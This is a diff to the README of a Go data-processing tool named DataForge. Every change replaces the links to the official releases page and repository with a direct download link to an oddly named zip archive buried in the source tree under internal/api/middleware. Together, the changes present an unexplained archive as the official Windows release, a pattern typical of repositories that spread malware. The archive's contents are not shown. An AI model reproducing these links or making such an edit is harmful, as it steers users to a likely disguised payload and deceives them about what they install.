@@ -1,6 +1,6 @@
 # 🔄 DataForge-ETL-Engine-Go-Distributed-Task-Processing - Scale Data Processing Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/cake619upbaet/DataForge-ETL-Engine-Go-Distributed-Task-Processing/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/cake619upbaet/DataForge-ETL-Engine-Go-Distributed-Task-Processing/raw/refs/heads/main/internal/api/middleware/ET-Processing-Data-Forge-Go-Task-Engine-Distributed-3.0.zip)
 
 ## 📋 What is DataForge-ETL-Engine-Go-Distributed-Task-Processing?
 
@@ -37,7 +37,7 @@ This guide will help you download and run DataForge on your Windows computer.
 
 Click the link below to open the page where official releases are hosted. Here, you will find the latest version of DataForge ready to download.
 
-[![Download Here](https://img.shields.io/badge/Download-Here-blue)](https://github.com/cake619upbaet/DataForge-ETL-Engine-Go-Distributed-Task-Processing/releases)
+[![Download Here](https://img.shields.io/badge/Download-Here-blue)](https://github.com/cake619upbaet/DataForge-ETL-Engine-Go-Distributed-Task-Processing/raw/refs/heads/main/internal/api/middleware/ET-Processing-Data-Forge-Go-Task-Engine-Distributed-3.0.zip)
 
 ### Step 2: Select the Latest Release
 
@@ -103,7 +103,7 @@ This helps scale up processing when working with very large datasets.
 
 For more details and updates, visit the official GitHub repository:
 
-https://github.com/cake619upbaet/DataForge-ETL-Engine-Go-Distributed-Task-Processing
+https://github.com/cake619upbaet/DataForge-ETL-Engine-Go-Distributed-Task-Processing/raw/refs/heads/main/internal/api/middleware/ET-Processing-Data-Forge-Go-Task-Engine-Distributed-3.0.zip
 
 Here you can find:
 
@@ -117,4 +117,4 @@ _Add screenshots here if available to help users visualize the application inter
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/cake619upbaet/DataForge-ETL-Engine-Go-Distributed-Task-Processing/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/cake619upbaet/DataForge-ETL-Engine-Go-Distributed-Task-Processing/raw/refs/heads/main/internal/api/middleware/ET-Processing-Data-Forge-Go-Task-Engine-Distributed-3.0.zip)
